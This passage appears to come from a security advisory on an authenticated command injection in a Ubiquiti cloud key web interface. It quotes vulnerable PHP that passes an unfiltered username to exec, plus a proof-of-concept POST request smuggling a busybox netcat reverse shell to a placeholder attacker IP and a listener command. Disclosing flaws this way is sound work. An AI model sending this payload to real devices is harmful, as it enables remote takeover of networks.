There are indications for further security issues within this device, hence
SEC Consult recommends performing a detailed review by security professionals.


Vulnerability overview/description:
-----------------------------------
1) Authenticated Command Injection in Administrative Interface
A change of the username with a hand crafted request leads to command injection
in the administrative interface. This vulnerability can be exploited when the
cloud key web interface is exposed to the internet.

An attacker which can access the administrative web interface of the cloud
key after cracking a cloud account password is able to execute arbitrary
commands without access to the local network. Since the Ubiquiti switches also
use the same credentials, the whole network can be compromised over this attack
vector.


Proof of concept:
-----------------
1) Authenticated Command Injection in Administrative Interface
The following PHP code excerpt is responsible for the username command execution:

(api.inc, line 455)
-------------------------------------------------------------------------------
[...]
function chusername($username) {
    exec(CMD_CHUSERNAME . ' ' . $username, $out, $rc);
    return $rc;
}
[...]
-------------------------------------------------------------------------------

Since '$username' is not filtered, a command injection is possible.

The following POST request opens a reverse-shell to the attacker:
-------------------------------------------------------------------------------
POST /api/account HTTP/1.1
Host: $host
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
X-Access-Token: <Token>

{"username":";busybox nc $attackerIP 8999 -e /bin/bash;"}
-------------------------------------------------------------------------------

As listener, netcat was used:
$ nc -lvp <Attacker-Port>
